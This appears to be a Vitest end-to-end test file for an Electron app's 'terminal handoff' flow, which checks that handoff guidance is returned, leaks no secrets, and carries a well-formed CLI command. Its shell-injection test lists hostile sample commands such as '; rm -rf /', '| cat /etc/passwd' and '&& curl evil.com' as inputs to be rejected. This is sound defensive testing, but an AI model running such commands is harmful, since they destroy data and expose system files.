/**
 * Terminal Handoff E2E Tests
 *
 * TASK-SC-08-E2E-VALIDATION: Scenario B
 *
 * Verifies the TerminalHandoff flow via IPC handlers:
 * - Scenario B: TerminalHandoff (AC-4, NFR-1)
 *   - Plan returns terminal_handoff guidance when API key is missing
 *   - terminalCommand is non-empty and starts with alphanumeric
 *   - No shell injection patterns in terminalCommand
 *   - No sensitive data leakage in handoff response
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import type { BrowserWindow as BrowserWindowType } from "electron";
import {
  handlerMap,
  createMockMainWindow,
  createMockEvent,
  createMockRuntimeFacade,
  createTerminalHandoffGuidance,
  invokeSkillCreatorPlan,
  assertIpcSuccess,
  assertExecutePlanAccepted,
  assertTerminalHandoff,
  assertNoSensitiveData,
  type MockBrowserWindow,
  type MockRuntimeFacade,
  type IpcResult,
} from "../helpers/skill-creator-test-helpers";

// === Electron Mock ===

vi.mock("electron", () => {
  const mockBW = {
    fromWebContents: vi.fn(),
    getAllWindows: vi.fn(() => []),
  };
  return {
    ipcMain: {
      handle: vi.fn(
        (channel: string, handler: (...args: unknown[]) => unknown) => {
          handlerMap.set(
            channel,
            handler as (...args: unknown[]) => Promise<unknown>,
          );
        },
      ),
      removeHandler: vi.fn((channel: string) => {
        handlerMap.delete(channel);
      }),
    },
    BrowserWindow: mockBW,
  };
});

// Import after mock
import { BrowserWindow } from "electron";
import {
  registerRuntimeSkillCreatorHandlers,
  unregisterRuntimeSkillCreatorHandlers,
} from "../../main/ipc/creatorHandlers";
import type { RuntimeSkillCreatorFacade } from "../../main/services/runtime/RuntimeSkillCreatorFacade";

// === Tests ===

describe("Scenario B: Terminal Handoff (AC-4, NFR-1)", () => {
  let mockMainWindow: MockBrowserWindow;
  let mockFacade: MockRuntimeFacade;

  beforeEach(() => {
    vi.clearAllMocks();
    handlerMap.clear();

    mockMainWindow = createMockMainWindow();
    mockFacade = createMockRuntimeFacade();

    (BrowserWindow.fromWebContents as ReturnType<typeof vi.fn>).mockReturnValue(
      mockMainWindow,
    );

    registerRuntimeSkillCreatorHandlers(
      mockMainWindow as unknown as BrowserWindowType,
      mockFacade as unknown as RuntimeSkillCreatorFacade,
    );
  });

  afterEach(() => {
    unregisterRuntimeSkillCreatorHandlers();
  });

  // ============================================
  // AC-4: TerminalHandoff guidance returned
  // ============================================

  describe("AC-4: TerminalHandoff guidance", () => {
    it("plan returns terminal_handoff with guidance when API key is not configured", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance(),
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      const result = await invokeSkillCreatorPlan(
        "PRレビューを自動化するスキルを作成して",
        "api-key",
        null,
      );

      assertIpcSuccess(result);
      assertTerminalHandoff(result.data);
    });

    it("terminalCommand is non-empty and starts with alphanumeric character", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance({
          terminalCommand: 'claude -p "スキルを作成してください"',
        }),
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      const result = await invokeSkillCreatorPlan(
        "テストスキル",
        "api-key",
        null,
      );

      assertIpcSuccess(result);
      const data = result.data as {
        type: string;
        guidance: { terminalCommand: string };
      };
      expect(data.guidance.terminalCommand).toBeTruthy();
      expect(data.guidance.terminalCommand.length).toBeGreaterThan(0);
      expect(/^[a-zA-Z]/.test(data.guidance.terminalCommand)).toBe(true);
    });

    it("guidance contains contextSummary and reason", async () => {
      const guidance = createTerminalHandoffGuidance({
        contextSummary: "API Key が未設定のため CLI で継続",
        reason: "API Key not configured",
      });
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance,
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      const result = await invokeSkillCreatorPlan("テスト", "api-key", null);

      assertIpcSuccess(result);
      const data = result.data as {
        type: string;
        guidance: { contextSummary: string; reason: string };
      };
      expect(data.guidance.contextSummary).toBe(
        "API Key が未設定のため CLI で継続",
      );
      expect(data.guidance.reason).toBe("API Key not configured");
    });

    it("works with different authMode values", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance({
          reason: "OAuth token expired",
        }),
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      const result = await invokeSkillCreatorPlan(
        "テストスキル",
        "oauth",
        null,
      );

      assertIpcSuccess(result);
      assertTerminalHandoff(result.data);
    });
  });

  // ============================================
  // NFR-1: Security — no sensitive data leakage
  // ============================================

  describe("NFR-1: No sensitive data in handoff response", () => {
    it("handoff response does not contain API keys or file paths", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance(),
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      const result = await invokeSkillCreatorPlan("テスト", "api-key", null);

      assertIpcSuccess(result);
      assertNoSensitiveData(result as IpcResult<unknown>);
    });

    it("error during handoff does not leak internal paths or keys", async () => {
      mockFacade.plan.mockRejectedValue(
        new Error(
          "Failed to generate handoff: sk-secret123abc at /Users/dev/.config/keys",
        ),
      );

      const result = await invokeSkillCreatorPlan("テスト", "api-key", null);

      expect(result.success).toBe(false);
      assertNoSensitiveData(result as IpcResult<unknown>);
    });
  });

  // ============================================
  // Shell injection prevention
  // ============================================

  describe("Shell injection prevention in terminalCommand", () => {
    it("terminalCommand does not start with shell metacharacters", async () => {
      const dangerousCommands = [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(malicious)",
        "`whoami`",
        "&& curl evil.com",
      ];

      for (const cmd of dangerousCommands) {
        const handoffResponse = {
          type: "terminal_handoff" as const,
          guidance: createTerminalHandoffGuidance({
            terminalCommand: cmd,
          }),
        };
        mockFacade.plan.mockResolvedValue(handoffResponse);

        const result = await invokeSkillCreatorPlan("テスト", "api-key", null);

        assertIpcSuccess(result);
        const data = result.data as {
          type: string;
          guidance: { terminalCommand: string };
        };
        // assertTerminalHandoff validates that terminalCommand starts with [a-zA-Z]
        // These malicious commands will fail that check
        expect(/^[a-zA-Z]/.test(data.guidance.terminalCommand)).toBe(false);
      }
    });

    it("valid terminalCommand passes format validation", async () => {
      const safeCommands = [
        'claude -p "テストスキルを作成してください"',
        "claude --prompt test-skill",
        'npx claude-code -p "create skill"',
      ];

      for (const cmd of safeCommands) {
        const handoffResponse = {
          type: "terminal_handoff" as const,
          guidance: createTerminalHandoffGuidance({
            terminalCommand: cmd,
          }),
        };
        mockFacade.plan.mockResolvedValue(handoffResponse);

        const result = await invokeSkillCreatorPlan("テスト", "api-key", null);

        assertIpcSuccess(result);
        assertTerminalHandoff(result.data);
      }
    });
  });

  // ============================================
  // Edge cases
  // ============================================

  describe("Edge cases", () => {
    it("execute-plan returns accepted ack and delegates execution asynchronously", async () => {
      mockFacade.executeAsync.mockResolvedValue(undefined);

      const handler = handlerMap.get("skill-creator:execute-plan")!;
      const result = (await handler(createMockEvent(), {
        planId: "plan-001",
        skillSpec: "test spec",
        authMode: "api-key",
        apiKey: "test-key",
      })) as IpcResult<unknown>;

      assertExecutePlanAccepted(result);
      expect(result).toEqual({
        accepted: true,
        planId: "plan-001",
      });
      expect(mockFacade.executeAsync).toHaveBeenCalledWith("plan-001", {
        planId: "plan-001",
        skillSpec: "test spec",
        authMode: "api-key",
        apiKey: "test-key",
      });
    });

    it("facade returning terminal_handoff for improve is handled", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance({
          reason: "Improve requires CLI for complex changes",
        }),
      };
      mockFacade.improve.mockResolvedValue(handoffResponse);

      const handler = handlerMap.get("skill-creator:improve-skill")!;
      const result = (await handler(createMockEvent(), {
        skillName: "test-skill",
        feedback: "改善してほしい",
        authMode: "api-key",
        apiKey: "test-key",
      })) as IpcResult<unknown>;

      assertIpcSuccess(result);
      expect((result.data as { type: string }).type).toBe("terminal_handoff");
    });

    it("plan with empty apiKey triggers terminal_handoff path", async () => {
      const handoffResponse = {
        type: "terminal_handoff" as const,
        guidance: createTerminalHandoffGuidance(),
      };
      mockFacade.plan.mockResolvedValue(handoffResponse);

      // apiKey is empty string — facade decides to handoff
      const result = await invokeSkillCreatorPlan("スキル作成", "api-key", "");

      assertIpcSuccess(result);
      assertTerminalHandoff(result.data);
    });
  });
});
